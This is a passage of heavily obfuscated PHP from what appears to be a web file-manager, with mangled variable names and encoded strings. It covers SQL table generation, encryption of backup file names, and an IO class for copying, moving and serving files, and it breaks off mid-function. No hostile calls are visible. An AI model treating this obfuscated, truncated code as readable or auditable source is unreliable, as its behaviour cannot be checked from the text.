$‰²‚¿¿Õ, $Á…ÊÚ©Ä, $ÒƒÆåŸ, $ÓÀìıçì); } if (!empty($ÆË¿“ê¡)) { ksort($ÆË¿“ê¡); $¼„Ş–·Ú = $Ï÷ÑÌë[475] . implode($Ï÷ÑÌë[1246], $ÆË¿“ê¡) . $Ï÷ÑÌë[475]; $úáİ”Öò[] = "\120\x52\x49\x4d\101\x52\131\x20\x4b\x45\x59\40\x28{$¼„Ş–·Ú}\x29"; } foreach ($™ÙÉşÕà as $÷Ø…Ñïê) { if ($÷Ø…Ñïê[$Ï÷ÑÌë[1316]]) { continue; } $Ö½È‡ÍÎ = array(); foreach ($÷Ø…Ñïê[$Ï÷ÑÌë[1317]] as $œæÓæËš) { $”½Š’Ó = null; foreach ($êş°ˆŒÚ as $ô´ÖÅÊ) { if ($ô´ÖÅÊ[$Ï÷ÑÌë[32]] == $œæÓæËš) { $”½Š’Ó = strtolower($ô´ÖÅÊ[$Ï÷ÑÌë[33]]); break; } } if ($”½Š’Ó == $Ï÷ÑÌë[1293] && in_array($œæÓæËš, $†îúÒ·Ç)) { $Ö½È‡ÍÎ[] = "\140{$œæÓæËš}\x60\x28\x32\x35\60\51"; } else { $Ö½È‡ÍÎ[] = "\140{$œæÓæËš}\140"; } } $¢ã¶¯ŞØ = ($÷Ø…Ñïê[$Ï÷ÑÌë[1315]] ? $Ï÷ÑÌë[1327] : $Ï÷ÑÌë[12]) . $Ï÷ÑÌë[1328]; $ŞĞÆÀÅ¦ = str_replace($Ï÷ÑÌë[1281] . $¼‘Ò¤ªµ . $Ï÷ÑÌë[11], $Ï÷ÑÌë[12], $÷Ø…Ñïê[$Ï÷ÑÌë[32]]); $ŞĞÆÀÅ¦ = str_replace($¼‘Ò¤ªµ . $Ï÷ÑÌë[11], $Ï÷ÑÌë[12], $ŞĞÆÀÅ¦); $úáİ”Öò[] = "{$¢ã¶¯ŞØ}\40\x60{$ŞĞÆÀÅ¦}\x60\x20\50" . implode($Ï÷ÑÌë[50], $Ö½È‡ÍÎ) . $Ï÷ÑÌë[1245]; } $ø§–ŸÜè = array("\x44\122\x4f\120\x20\x54\101\x42\114\105\x20\111\106\40\x45\130\111\123\x54\123\x20{$­•œÕ™Ô}\x3b", "\x43\x52\105\x41\124\x45\x20\124\101\x42\x4c\x45\40{$­•œÕ™Ô}\40\x28", implode($Ï÷ÑÌë[50] . PHP_EOL, $úáİ”Öò), $Ï÷ÑÌë[1329]); $ø§–ŸÜè = implode(PHP_EOL, $ø§–ŸÜè); if ($‰²‚¿¿Õ == $Ï÷ÑÌë[902]) { return $ø§–ŸÜè; } $Œá»ËÉ¶[$Ï÷ÑÌë[902]] = $ø§–ŸÜè; return $Œá»ËÉ¶; } private function escapeName($ïÑÜ†–œ, $òÜÊë = "\x6d\171\x73\x71\x6c") { $™­Æğ†× =& $_SERVER[ïÃ°£«Ê]; $ïÑÜ†–œ = preg_replace($™­Æğ†×[1330], $™­Æğ†×[12], $ïÑÜ†–œ); if ($òÜÊë === $™­Æğ†×[902]) { return "\x60{$ïÑÜ†–œ}\x60"; } return "\x22{$ïÑÜ†–œ}\42"; } public function mixBakList($¸„â‚Æ•) { $Ú–©¸À =& $_SERVER[ïÃ°£«Ê]; $¸„â‚Æ• = rtrim($¸„â‚Æ•, $Ú–©¸À[8]) . $Ú–©¸À[8]; $ºä€ıŞª = $Ú–©¸À[1331]; $î¹øİÁŞ = IO::listPath($¸„â‚Æ•); if (empty($î¹øİÁŞ[$Ú–©¸À[86]])) { return !1; } $ãˆôú¤ï = array(); foreach ($î¹øİÁŞ[$Ú–©¸À[86]] as $¼Ù›æÖ => $¡ĞÂˆéÑ) { if (!$¡ĞÂˆéÑ[$Ú–©¸À[32]] || !$¡ĞÂˆéÑ[$Ú–©¸À[87]]) { continue; } $¶œêÂÏ£ = Mcrypt::encode($¡ĞÂˆéÑ[$Ú–©¸À[32]], $ºä€ıŞª); $¹ë˜¼” = md5($¶œêÂÏ£); IO::rename($¡ĞÂˆéÑ[$Ú–©¸À[87]], $¹ë˜¼”); $ãˆôú¤ï[$¹ë˜¼”] = $¶œêÂÏ£; } $…ìÒâ›‰ = md5($Ú–©¸À[1332] . $ºä€ıŞª); IO::setContent($¸„â‚Æ• . $…ìÒâ›‰, json_encode($ãˆôú¤ï)); return !0; } public function unmixBakList($ñË­¹Íã) { $ÌŞüö‘İ =& $_SERVER[ïÃ°£«Ê]; $ñË­¹Íã = rtrim($ñË­¹Íã, $ÌŞüö‘İ[8]) . $ÌŞüö‘İ[8]; $†şõÜù = $this->unmixBakListGet($ñË­¹Íã, !0); if (empty($†şõÜù)) { return !1; } foreach ($†şõÜù as $­Îçë­â => $ƒ’ôû ™) { $˜¾¾â“È = IO::rename($ñË­¹Íã . $ƒ’ôû ™, $­Îçë­â); if (!$˜¾¾â“È) { return !1; } } return !0; } public function unmixBakListGet($¿Üà±÷ú, $šÏ¤‰ó = false) { $ÛìÂÆ§ =& $_SERVER[ïÃ°£«Ê]; $¿Üà±÷ú = rtrim($¿Üà±÷ú, $ÛìÂÆ§[8]) . $ÛìÂÆ§[8]; $…¬š°üâ = $ÛìÂÆ§[1331]; $­Òâã¨ù = md5($ÛìÂÆ§[1332] . $…¬š°üâ); $Ğöë‚ = $¿Üà±÷ú . $­Òâã¨ù; if (!IO::exist($Ğöë‚)) { return !1; } $ä­°Œèğ = json_decode(IO::getContent($Ğöë‚), !0); if (empty($ä­°Œèğ)) { return !1; } $îÂæ•øÓ = array(); foreach ($ä­°Œèğ as $¶Ì‡†µ => $¾§Ì¢¤õ) { $­Òâã¨ù = Mcrypt::decode($¾§Ì¢¤õ, $…¬š°üâ); $îÂæ•øÓ[$­Òâã¨ù] = $¶Ì‡†µ; } if ($šÏ¤‰ó) { IO::remove($Ğöë‚, !1); } return $îÂæ•øÓ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($çë»Õæ×, $Æ…”„ÌØ) { $¾íà°Ì· =& $_SERVER[ïÃ°£«Ê]; $ƒËÙìŸÍ = $Æ…”„ÌØ; $GLOBALS[$¾íà°Ì·[1333]] = $¾íà°Ì·[1334] . $çë»Õæ×; Hook::trigger($¾íà°Ì·[1334] . $çë»Õæ× . $¾íà°Ì·[1335], $ƒËÙìŸÍ); $†£Ù”½À = self::driverMake($Æ…”„ÌØ[0]); if (!$†£Ù”½À) { return !1; } if ($çë»Õæ× == $¾íà°Ì·[641] || $çë»Õæ× == $¾íà°Ì·[643] || $çë»Õæ× == $¾íà°Ì·[1336]) { if (!trim($†£Ù”½À->path . $¾íà°Ì·[463], $¾íà°Ì·[8])) { return !1; } } if (method_exists($†£Ù”½À, $çë»Õæ×)) { $¦Ö¤Í´ = @call_user_func_array(array($†£Ù”½À, $çë»Õæ×), $Æ…”„ÌØ); } else { if (method_exists($†£Ù”½À, $¾íà°Ì·[1337])) { $¦Ö¤Í´ = @call_user_func_array(array($†£Ù”½À, $çë»Õæ×), $Æ…”„ÌØ); } else { if (method_exists(self, $çë»Õæ×)) { $¦Ö¤Í´ = @call_user_func_array(array(self, $çë»Õæ×), $Æ…”„ÌØ); } else { $¦Ö¤Í´ = call_user_func_array(array(parent, $çë»Õæ×), $Æ…”„ÌØ); } } } Hook::trigger($¾íà°Ì·[1334] . $çë»Õæ× . $¾íà°Ì·[1338], $ƒËÙìŸÍ, $¦Ö¤Í´); return $¦Ö¤Í´; } public static function init($¶Ö”“ù) { return self::driverMake($¶Ö”“ù); } public static function copy($Ù²ŞÍƒø, $´õˆáÅ, $®ìüÊı = false, $ÙüÜ¹¹ = false) { return self::copyMoveStart($Ù²ŞÍƒø, $´õˆáÅ, $®ìüÊı, $_SERVER[ïÃ°£«Ê][641], $ÙüÜ¹¹); } public static function move($¾À÷ªù”, $ñ”Š“Ã›, $¢ÔàÅ€ˆ = false, $¢¢Î­ÏÍ = false) { return self::copyMoveStart($¾À÷ªù”, $ñ”Š“Ã›, $¢ÔàÅ€ˆ, $_SERVER[ïÃ°£«Ê][643], $¢¢Î­ÏÍ); } public static function copyMoveChildren($ÏñÅÅÕÛ, $ç‰áÅ§, $´ºÂ…¨¹ = "\143\x6f\x70\171", $…‚˜¡ƒ“ = REPEAT_REPLACE) { $Ëıº¹«ú =& $_SERVER[ïÃ°£«Ê]; $¥™ÏéÌ¿ = $ÏñÅÅÕÛ; $Ñ‚÷ÓÚ“ = self::driverMake($ÏñÅÅÕÛ); $ƒàµéË´ = $Ñ‚÷ÓÚ“->listPath($ÏñÅÅÕÛ, !0); $ç¼ëˆî = array_merge($ƒàµéË´[$Ëıº¹«ú[86]], $ƒàµéË´[$Ëıº¹«ú[85]]); foreach ($ç¼ëˆî as $£ö‚ØÇÅ) { self::copyMoveStart($£ö‚ØÇÅ[$Ëıº¹«ú[87]], $ç‰áÅ§, $…‚˜¡ƒ“, $´ºÂ…¨¹, !1); } if ($´ºÂ…¨¹ == $Ëıº¹«ú[643]) { self::remove($¥™ÏéÌ¿); } } private static function copyMoveStart($ÏÍŸæ£–, $ˆ–âŒàñ, $¡³¯Éúû, $ˆ¡“µÙĞ, $Â¼œñ÷Ë) { $×Î§‡Ãï =& $_SERVER[ïÃ°£«Ê]; $ø×öÚæ‹ = array($ÏÍŸæ£–, $ˆ–âŒàñ, $¡³¯Éúû, $Â¼œñ÷Ë); Hook::trigger($×Î§‡Ãï[1334] . $ˆ¡“µÙĞ . $×Î§‡Ãï[1335], $ø×öÚæ‹); $ûÒ°ĞÓ‹ = self::copyMove($ÏÍŸæ£–, $ˆ–âŒàñ, $¡³¯Éúû, $ˆ¡“µÙĞ, $Â¼œñ÷Ë); Hook::trigger($×Î§‡Ãï[1334] . $ˆ¡“µÙĞ . $×Î§‡Ãï[1338], $ø×öÚæ‹, $ûÒ°ĞÓ‹); return $ûÒ°ĞÓ‹; } public static function saveFile($¹îÒÇòï, $Ñ³õ½ê, $’¢ãëÜë = true) { $¾°–‘ =& $_SERVER[ïÃ°£«Ê]; $óÑÈÈæã = self::info($Ñ³õ½ê); $³›Áä‹Š = self::driverMake($¹îÒÇòï); $ÙŒŠ«¯¸ = self::driverMake($Ñ³õ½ê); $ÄØÅ¼‘‡ = !1; if ($ÙŒŠ«¯¸->pathParse[$¾°–‘[1339]]) { $ÄØÅ¼‘‡ = $ÙŒŠ«¯¸; $ô½ó¬ñ = $ÙŒŠ«¯¸->pathParse[$¾°–‘[1339]]; $ÙŒŠ«¯¸ = self::driverMake($ô½ó¬ñ); } if ($³›Áä‹Š->pathParse[$¾°–‘[1339]]) { $¸ÉÉ£Àë = $³›Áä‹Š->pathParse[$¾°–‘[1339]]; $³›Áä‹Š = self::driverMake($¸ÉÉ£Àë); } $ë¦¾Ú¿´ = $ÙŒŠ«¯¸->pathFather($Ñ³õ½ê); $âé°á² = !0; if (!$’¢ãëÜë && self::driverIsSame($³›Áä‹Š, $ÙŒŠ«¯¸)) { $âé°á² = !1; } $“¯÷Öş = self::copyFile($³›Áä‹Š, $¹îÒÇòï, $ÙŒŠ«¯¸, $ë¦¾Ú¿´, $óÑÈÈæã[$¾°–‘[32]], $âé°á²); if ($ÄØÅ¼‘‡) { $“¯÷Öş = $ÄØÅ¼‘‡->getPathOuter($“¯÷Öş); } return $“¯÷Öş; } private static function copyMove($šËİÂ”, $‘¸×èš, $¹üÕ¶•€, $½¤Â¿Á, $¥êÒÓ‚‹ = false) { $øÛ‡üúÌ =& $_SERVER[ïÃ°£«Ê]; if (!$šËİÂ” || $šËİÂ” == $øÛ‡üúÌ[8] || !$‘¸×èš) { return !1; } ignore_timeout(); $ø£Çıô = self::driverMake($šËİÂ”); $¿ôó¼™ğ = self::driverMake($‘¸×èš); $¤¶×Ñù = $½¤Â¿Á == $øÛ‡üúÌ[643]; $¸œ•¸È = !1; if ($¿ôó¼™ğ->pathParse[$øÛ‡üúÌ[1339]]) { $¸œ•¸È = $¿ôó¼™ğ; $‘¸×èš = $¿ôó¼™ğ->pathParse[$øÛ‡üúÌ[1339]]; $¿ôó¼™ğ = self::driverMake($‘¸×èš); } if ($ø£Çıô->pathParse[$øÛ‡üúÌ[1339]]) { $šËİÂ” = $ø£Çıô->pathParse[$øÛ‡üúÌ[1339]]; $ø£Çıô = self::driverMake($šËİÂ”); } self::check($ø£Çıô, $šËİÂ”, $¿ôó¼™ğ, $‘¸×èš); Hook::trigger($øÛ‡üúÌ[1340], $ø£Çıô, $šËİÂ”, $¿ôó¼™ğ, $‘¸×èš); $¯şœˆŸ = self::driverIsSame($ø£Çıô, $¿ôó¼™ğ); if ($¯şœˆŸ) { if ($½¤Â¿Á == $øÛ‡üúÌ[643] && !method_exists($¿ôó¼™ğ, $øÛ‡üúÌ[1341]) && trim($‘¸×èš, $øÛ‡üúÌ[8]) == trim($¿ôó¼™ğ->pathFather($šËİÂ”), $øÛ‡üúÌ[8])) { if ($ø£Çıô->pathThis($šËİÂ”) != $¥êÒÓ‚‹ && !$ø£Çıô->isOsDriver()) { return $ø£Çıô->rename($šËİÂ”, $¥êÒÓ‚‹); } return $¿ôó¼™ğ->getPathOuter($šËİÂ”); } if (method_exists($¿ôó¼™ğ, $½¤Â¿Á)) { return $¿ôó¼™ğ->{$½¤Â¿Á}($šËİÂ”, $‘¸×èš, $¹üÕ¶•€, $¥êÒÓ‚‹); } } if ($¯şœˆŸ && $½¤Â¿Á == $øÛ‡üúÌ[643] && $¿ôó¼™ğ->getType() == $øÛ‡üúÌ[106]) { $˜¨å³ˆæ = $¿ôó¼™ğ->movePath($šËİÂ”, $‘¸×èš, $¥êÒÓ‚‹); if ($˜¨å³ˆæ) { return $˜¨å³ˆæ; } } $Ó®ùØø· = $ø£Çıô->isFile($šËİÂ”); if (!$Ó®ùØø· && $¿ôó¼™ğ->getType() == $øÛ‡üúÌ[859] && $ø£Çıô->getType() == $øÛ‡üúÌ[106]) { $˜¨å³ˆæ = $¿ôó¼™ğ->copyFolderFromIO($ø£Çıô, $šËİÂ”, $‘¸×èš, $¹üÕ¶•€, $¤¶×Ñù, $¥êÒÓ‚‹); } else { $˜¨å³ˆæ = self::copyPath($ø£Çıô, $šËİÂ”, $¿ôó¼™ğ, $‘¸×èš, $¹üÕ¶•€, $¤¶×Ñù, $Ó®ùØø·, $¥êÒÓ‚‹); } if ($˜¨å³ˆæ && $¤¶×Ñù) { $ø£Çıô->remove($šËİÂ”); } if ($¸œ•¸È) { $˜¨å³ˆæ = $¸œ•¸È->getPathOuter($˜¨å³ˆæ); } return $˜¨å³ˆæ; } private static function check($‹ÎØìÍ®, $¼ª‚úğÎ, $÷Ù²ÙÒ, &$ˆĞ×Æƒ») { $î‚¤„Ûµ =& $_SERVER[ïÃ°£«Ê]; if (self::driverIsSame($‹ÎØìÍ®, $÷Ù²ÙÒ) && $‹ÎØìÍ®->isFolder($¼ª‚úğÎ) && $‹ÎØìÍ®->isParentOf($¼ª‚úğÎ, $ˆĞ×Æƒ»)) { show_json(LNG($î‚¤„Ûµ[1342]), !1); } if (!$‹ÎØìÍ®->exist($¼ª‚úğÎ)) { show_json(LNG($î‚¤„Ûµ[105]), !1); } } private static function copyPath($†¥› ‰ê, $ğ¤˜Åõ½, $§ÂŞøÓÇ, $šæñ—óğ, $‡ë—öŸÊ, $ó§ÚÖ», $…’–¯ş°, $­¡ŸŒü¯ = false, $¬¨­Û° = true) { $‹Ó«èö =& $_SERVER[ïÃ°£«Ê]; $ñ±´¬» = empty($­¡ŸŒü¯) && $­¡ŸŒü¯ !== $‹Ó«èö[228] ? $†¥› ‰ê->pathThis($ğ¤˜Åõ½) : $­¡ŸŒü¯; if ($‡ë—öŸÊ) { $»ú£÷™¤ = $§ÂŞøÓÇ->fileNameExist($šæñ—óğ, $ñ±´¬»); $Ùá´‡Ø = $ñ±´¬»; $ñ±´¬» = $§ÂŞøÓÇ->fileNameAuto($šæñ—óğ, $ñ±´¬», $‡ë—öŸÊ, !$…’–¯ş°); if (!$»ú£÷™¤ || $Ùá´‡Ø != $ñ±´¬») { $‡ë—öŸÊ = !1; } if ($¬¨­Û° && !$‡ë—öŸÊ) { $§ÂŞøÓÇ->_data[$‹Ó«èö[1343]] = !0; } } if ($…’–¯ş°) { return self::copyFile($†¥› ‰ê, $ğ¤˜Åõ½, $§ÂŞøÓÇ, $šæñ—óğ, $ñ±´¬», $ó§ÚÖ»); } if ($‡ë—öŸÊ == REPEAT_RENAME_FOLDER) { $‡ë—öŸÊ = !1; } $±Á„¨÷¡ = rtrim($šæñ—óğ, $‹Ó«èö[8]) . $‹Ó«èö[8] . $ñ±´¬»; $ø×ä€ = $§ÂŞøÓÇ->mkdir($§ÂŞøÓÇ->getPath($±Á„¨÷¡), $‡ë—öŸÊ); $šæñ—óğ = $§ÂŞøÓÇ->getPathInner($ø×ä€); $›€ÇÄ¥¹ = $†¥› ‰ê->listPath($ğ¤˜Åõ½, !0); $›€ÇÄ¥¹ = is_array($›€ÇÄ¥¹) ? $›€ÇÄ¥¹ : array($‹Ó«èö[86] => array(), $‹Ó«èö[85] => array()); $—÷€¼š = array_merge($›€ÇÄ¥¹[$‹Ó«èö[86]], $›€ÇÄ¥¹[$‹Ó«èö[85]]); foreach ($—÷€¼š as $®¯€ÅŠŸ) { $šç­¹Ñº = $®¯€ÅŠŸ[$‹Ó«èö[33]] == $‹Ó«èö[230]; $ğ¤˜Åõ½ = $†¥› ‰ê->getPathInner($®¯€ÅŠŸ[$‹Ó«èö[87]]); $“Š”şÚ¾ = self::copyPath($†¥› ‰ê, $ğ¤˜Åõ½, $§ÂŞøÓÇ, $šæñ—óğ, $‡ë—öŸÊ, $ó§ÚÖ», $šç­¹Ñº, !1, !1); if (!$“Š”şÚ¾) { IO::errorTips($‹Ó«èö[1344] . $ğ¤˜Åõ½ . $‹Ó«èö[73] . $šæñ—óğ); } } self::copyMoveKeepInfo($†¥› ‰ê, $ğ¤˜Åõ½, $ø×ä€); return $ø×ä€; } private static function copyFile($ªÄö¤”‘, $§ÁÜÕ¨À, $™îÛÃéÀ, $…Ì¦æ£ê, $ü ãò³, $Ş³¹¬¨) { $©Ä…ı“ª =& $_SERVER[ïÃ°£«Ê]; $…Ì¦æ£ê = $™îÛÃéÀ->getPath(rtrim($…Ì¦æ£ê, $©Ä…ı“ª[8]) . $©Ä…ı“ª[8] . $ü ãò³); $ğ¬Ö–â¶ = $©Ä…ı“ª[1345] . time() . rand_string(5); Hook::trigger($©Ä…ı“ª[1346], $ªÄö¤”‘, $§ÁÜÕ¨À, $™îÛÃéÀ, $…Ì¦æ£ê, $ü ãò³, $ğ¬Ö–â¶); if (self::driverIsSame($ªÄö¤”‘, $™îÛÃéÀ)) { if ($Ş³¹¬¨) { $ÊÏÉáãÊ = $™îÛÃéÀ->moveFile($§ÁÜÕ¨À, $…Ì¦æ£ê); } else { $ÊÏÉáãÊ = $™îÛÃéÀ->copyFile($§ÁÜÕ¨À, $…Ì¦æ£ê); } Hook::trigger($©Ä…ı“ª[1347], $ªÄö¤”‘, $§ÁÜÕ¨À, $™îÛÃéÀ, $…Ì¦æ£ê, $ü ãò³, $ÊÏÉáãÊ); self::copyMoveKeepInfo($ªÄö¤”‘, $§ÁÜÕ¨À, $ÊÏÉáãÊ); return $ÊÏÉáãÊ; } $®Ãå¿â¼ = TEMP_FILES; if ($GLOBALS[$©Ä…ı“ª[6]][$©Ä…ı“ª[92]][$©Ä…ı“ª[899]]) { $®Ãå¿â¼ = $GLOBALS[$©Ä…ı“ª[6]][$©Ä…ı“ª[92]][$©Ä…ı“ª[899]]; } $ÕØàÓºÃ = $®Ãå¿â¼; mk_dir($ÕØàÓºÃ); $Ñ™Îï… = $ÕØàÓºÃ . $ğ¬Ö–â¶; $ÜçÂôÔê = $Ñ™Îï…; $Ñ™Îï… = $ªÄö¤”‘->download($§ÁÜÕ¨À, $Ñ™Îï…); $Ñ™Îï… = $ªÄö¤”‘->iconvApp($Ñ™Îï…); if (substr($Ñ™Îï…, strlen($®Ãå¿â¼)) == $®Ãå¿â¼) { $Ş³¹¬¨ = !0; } $ÊÏÉáãÊ = $™îÛÃéÀ->upload($…Ì¦æ£ê, $Ñ™Îï…, $Ş³¹¬¨); self::remove($ÜçÂôÔê); Hook::trigger($©Ä…ı“ª[1347], $ªÄö¤”‘, $§ÁÜÕ¨À, $™îÛÃéÀ, $…Ì¦æ£ê, $ü ãò³, $ÊÏÉáãÊ); self::copyMoveKeepInfo($ªÄö¤”‘, $§ÁÜÕ¨À, $ÊÏÉáãÊ); return $ÊÏÉáãÊ; } private static function copyMoveKeepInfo($·•Ô‘ÌŞ, $Ã°¿œ»£, $”ä£’È•) { if (!$”ä£’È•) { return; } $Ìº‰«åİ = $·•Ô‘ÌŞ->info($Ã°¿œ»£); if (!is_array($Ìº‰«åİ)) { return; } IO::setModifyTime($”ä£’È•, $Ìº‰«åİ[$_SERVER[ïÃ°£«Ê][88]]); } public static function pathFather($ÏíÜ‡Á) { $Ì±ì´–‹ = IO::init($ÏíÜ‡Á); $íŒ§Şù‚ = $Ì±ì´–‹->pathFather($Ì±ì´–‹->path); return $Ì±ì´–‹->getPathOuter($íŒ§Şù‚); } public static function fileOut($²â¿¬Ş£, $ÄĞ ËœÈ = false, $Â”çÀíä = false, $ûõü‚Ú¨ = '') { $÷ÛÎ¾ø = self::driverMake($²â¿¬Ş£); if ($÷ÛÎ¾ø->isFileOutServer()) { return $÷ÛÎ¾ø->fileOutServer($²â¿¬Ş£, $ÄĞ ËœÈ, $Â”çÀíä, $ûõü‚Ú¨); } return $÷ÛÎ¾ø->fileOut($²â¿¬Ş£, $ÄĞ ËœÈ, $Â”çÀíä, $ûõü‚Ú¨); } public static function fileOutImage($Òõ˜ı–Ó, $ŸŞõöÌà = 250) { $ÂÅ£Ş° = array(250, 600, 1200, 2000, 3000, 5000); for ($Âà¼¹Õİ = 0; $Âà¼¹Õİ < count($ÂÅ£Ş°); $Âà¼¹Õİ++) { if ($Âà¼¹Õİ == 0 && $ŸŞõöÌà <= $ÂÅ£Ş°[$Âà¼¹Õİ]) { $ŸŞõöÌà = $ÂÅ£Ş°[$Âà¼¹Õİ]; break; } else { if ($ŸŞõöÌà > $ÂÅ£Ş°[$Âà¼¹Õİ - 1] && $ŸŞõöÌà <= $ÂÅ£Ş°[$Âà¼¹Õİ]) { $ŸŞõöÌà = $ÂÅ£Ş°[$Âà¼¹Õİ]; break; } else { if ($Âà¼¹Õİ == count($ÂÅ£Ş°) - 1 && $ŸŞõöÌà > $ÂÅ£Ş°[$Âà¼¹Õİ]) { $ŸŞõöÌà = $ÂÅ£Ş°[$Âà¼¹Õİ]; break; } } } } $»”Á¯¸È = self::driverMake($Òõ˜ı–Ó); if ($»”Á¯¸È->isFileOutServer()) { return $»”Á¯¸È->fileOutImageServer($Òõ˜ı–Ó, $ŸŞõöÌà); } return $»”Á¯¸È->fileOutImage($Òõ˜ı–Ó, $ŸŞõöÌà); } private static function driverIsSame($ö¯È¼©¡, $Û°‰Ùëó) { $¼Êà‹—Ì =& $_SERVER[ïÃ°£«Ê]; $è‡Ø¶»¦ = $ö¯È¼©¡->getType(); $Ñ­ƒ“Ì = $Û°‰Ùëó->getType(); if ($è‡Ø¶»¦ != $Ñ­ƒ“Ì) { return !1; } if ($è‡Ø¶»¦ == $¼Êà‹—Ì[859]) { return !0; } if ($è‡Ø¶»¦ == $¼Êà‹—Ì[106]) { return !0; } if ($ö¯È¼©¡->pathDriver == $Û°‰Ùëó->pathDriver) { return !0; } return !1; } public static function copyUpdate($™ÂïÕ, $º½ŠÁïô) { $²”–·âÛ =& $_SERVER[ïÃ°£«Ê]; if (!IO::exist($™ÂïÕ)) { return !1; } if (!IO::exist($º½ŠÁïô)) { IO::mkdir($º½ŠÁïô); } $§ÀÄ¶Æ = array_to_keyvalue(self::listAllSimple($™ÂïÕ), $²”–·âÛ[87]); $ÎàÌ‚³Ä = array_to_keyvalue(self::listAllSimple($º½ŠÁïô), $²”–·âÛ[87]); $¥‚ÆÛ¬ = array(); $¿İ„Æ×Ê = array(); foreach ($§ÀÄ¶Æ as $ñÜĞåî => $àÃˆ¬Î›) { if (isset($ÎàÌ‚³Ä[$ñÜĞåî])) { if ($àÃˆ¬Î›[$²”–·âÛ[78]] == 1) { continue; } if ($ÎàÌ‚³Ä[$ñÜĞåî][$²”–·âÛ[79]] == $àÃˆ¬Î›[$²”–·âÛ[79]]) { continue; } } if ($àÃˆ¬Î›[$²”–·âÛ[78]] == 1) { $¿İ„Æ×Ê[] = $º½ŠÁïô . $²”–·âÛ[8] . trim($ñÜĞåî, $²”–·âÛ[8]); continue; } $íÅÇá‹” = strstr(trim($ñÜĞåî, $²”–·âÛ[8]), $²”–·âÛ[8]) ? get_path_father($ñÜĞåî) : $²”–·âÛ[12]; $¥‚ÆÛ¬[] = array($²”–·âÛ[1348] => $àÃˆ¬Î›[$²”–·âÛ[89]], $²”–·âÛ[1349] => rtrim($º½ŠÁïô, $²”–·âÛ[8]) . $²”–·âÛ[8] . $íÅÇá‹”, $²”–·âÛ[1350] => $àÃˆ¬Î›); } $‚û½±ì® = array($²”–·âÛ[230] => $¥‚ÆÛ¬, $²”–·âÛ[78] => $¿İ„Æ×Ê); Hook::trigger($²”–·âÛ[1351], $™ÂïÕ, $º½ŠÁïô, $‚û½±ì®); foreach ($¿İ„Æ×Ê as $àÃˆ¬Î›) { IO::mkdir($àÃˆ¬Î›); } foreach ($¥‚ÆÛ¬ as $àÃˆ¬Î›) { IO::copy($àÃˆ¬Î›[$²”–·âÛ[1348]], $àÃˆ¬Î›[$²”–·âÛ[1349]], REPEAT_REPLACE); } } public static function fileSubstr($ä­Şìå”, $ˆç±–ùÁ, $è©æä£‡ = false) { $€¥°ä‡ =& $_SERVER[ïÃ°£«Ê]; $ñÔŸ­×Í = self::driverMake($ä­Şìå”); $äáÖòûØ = $ñÔŸ­×Í->size($ä­Şìå”); $ÎÍá©¦ = $ˆç±–ùÁ; $¬ÏŞ§šÈ = $è©æä£‡; if ($ˆç±–ùÁ < 0) { $ˆç±–ùÁ = $äáÖòûØ + $ˆç±–ùÁ; } if ($è©æä£‡ === !1) { $è©æä£‡ = $äáÖòûØ - $ˆç±–ùÁ; } if ($ˆç±–ùÁ + $è©æä£‡ > $äáÖòûØ) { $è©æä£‡ = $äáÖòûØ - $ˆç±–ùÁ; } if (!$äáÖòûØ && $ñÔŸ­×Í->getType() == $€¥°ä‡[106] && !$ñÔŸ­×Í->exist($ä­Şìå”)) { $ïØƒä† = get_path_this($ä­Şìå”); $­Ÿ¿Ûñİ = parse_url_query($ïØƒä†); if (is_array($­Ÿ¿Ûñİ) && isset($­Ÿ¿Ûñİ[$€¥°ä‡[32]])) { $ïØƒä† = urldecode($­Ÿ¿Ûñİ[$€¥°ä‡[32]]); } throw new Exception($€¥°ä‡[1352] . LNG($€¥°ä‡[1353]) . $€¥°ä‡[1134] . clear_html($ïØƒä†) . $€¥°ä‡[12]); } if ($è©æä£‡ <= 0) { return $€¥°ä‡[12]; } if ($ˆç±–ùÁ < 0 || $ˆç±–ùÁ >= $äáÖòûØ || $è©æä£‡ > $GLOBALS[$€¥°ä‡[6]][$€¥°ä‡[92]][$€¥°ä‡[1354]]) { throw new Exception("\146\151\154\x65\x52\145\141\x64\x20\145\162\162\x6f\162\x2c\157\166\145\x72\40\x69\157\122\145\x61\x64\115\141\x78\x21\40\x73\164\141\x72\x74\75{$ˆç±–ùÁ}\x3b\154\x65\156\x67\x74\150\75{$è©æä£‡}\x3b\40\x73\x69\172\145\x3d{$äáÖòûØ}\x3b"); } $İ‹Ò†ƒ… = $ñÔŸ­×Í->fileSubstr($ä­Şìå”, $ˆç±–ùÁ, $è©æä£‡); if (!$İ‹Ò†ƒ… && $è©æä£‡ && isset($GLOBALS[$€¥°ä‡[1355]])) { throw new Exception($GLOBALS[$€¥°ä‡[1355]][$€¥°ä‡[1356]]); } return $İ‹Ò†ƒ…; } private static function driverMake(&$êğıë‘¾) { $×—•†Ä =& $_SERVER[ïÃ°£«Ê]; $®²ŞÛÈŠ = KodIO::parse($êğıë‘¾); if (!self::$driverListSystem) { $àÂ¬’ = Model($×—•†Ä[869])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($àÂ¬’, $×—•†Ä[487]); } if ($®²ŞÛÈŠ[$×—•†Ä[33]] == KodIO::KOD_IO && !self::$driverListSystem[$®²ŞÛÈŠ[$×—•†Ä[487]]]) { throw new Exception($×—•†Ä[1357]); return !1; } $êğıë‘¾ = $®²ŞÛÈŠ[$×—•†Ä[1358]]; $ö¹¦Ğé = self::driverGet($®²ŞÛÈŠ, $êğıë‘¾); return $ö¹¦Ğé; } private static function driverGet($Ê¤¹é¬¤, &$â¶òÆ¡³) { $›ÁÓÜİÂ =& $_SERVER[ïÃ°£«Ê]; $×¹¤ú”¢ = $Ê¤¹é¬¤[$›ÁÓÜİÂ[1359]]; $İÀÑ¶÷ = $Ê¤¹é¬¤[$›ÁÓÜİÂ[487]]; switch ($Ê¤¹é¬¤[$›ÁÓÜİÂ[33]]) { case KodIO::KOD_IO: $Í›‹ÍÀÉ = self::$driverListSystem[$İÀÑ¶÷]; break; case KodIO::KOD_SOURCE: $â¶òÆ¡³ = $İÀÑ¶÷ . $â¶òÆ¡³; $Í›‹ÍÀÉ = array($›ÁÓÜİÂ[1360] => $›ÁÓÜİÂ[1361], $›ÁÓÜİÂ[6] => $Ê¤¹é¬¤); $Í›‹ÍÀÉ[$›ÁÓÜİÂ[6]][$›ÁÓÜİÂ[1362]] = $Ê¤¹é¬¤[$›ÁÓÜİÂ[487]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ä¾ËéÒí = 